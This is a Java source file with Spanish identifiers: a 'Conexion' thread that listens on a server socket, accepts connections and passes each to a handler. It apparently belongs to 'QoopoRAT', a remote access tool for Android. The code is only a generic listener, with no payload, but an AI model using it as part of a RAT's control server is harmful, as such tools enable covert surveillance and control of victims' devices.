/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package qooporat.android;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

/**
 *
 * @author alberto
 */
public class Conexion extends Thread {

    private ServerSocket p_escucha;
    private Socket p_conexion;
    private QoopoRAT cliente;
    public boolean CONECTADO = true;

    public Conexion(int puerto, int cola, QoopoRAT contenedor) throws IOException {
        this.p_escucha = new ServerSocket(puerto, cola);
        cliente = contenedor;
        CONECTADO = true;
    }

    @Override
    public void run() {
        do {
            try {
                this.p_conexion = this.p_escucha.accept();
                Servidor user = new Servidor(this.p_conexion, cliente);
//                cliente.ponerEstado("Conexion desde:" + p_conexion.getInetAddress().getHostAddress());
                cliente.ponerEstado("Conexion desde:" + p_conexion.getRemoteSocketAddress().toString());
                user.start();
            } catch (IOException ex) {
                cliente.ponerEstado("ERROR al realizar conexion" + ex.getMessage());
            }
        } while (CONECTADO);
    }

    public void stopPara() {
        CONECTADO = false;
        try {
            this.p_escucha.close();
        } catch (IOException ex) {
        }
    }

    public ServerSocket getP_escucha() {
        return p_escucha;
    }

    public void setP_escucha(ServerSocket p_escucha) {
        this.p_escucha = p_escucha;
    }

    public Socket getP_conexion() {
        return p_conexion;
    }

    public void setP_conexion(Socket p_conexion) {
        this.p_conexion = p_conexion;
    }

    public QoopoRAT getCliente() {
        return cliente;
    }

    public void setCliente(QoopoRAT cliente) {
        this.cliente = cliente;
    }
}
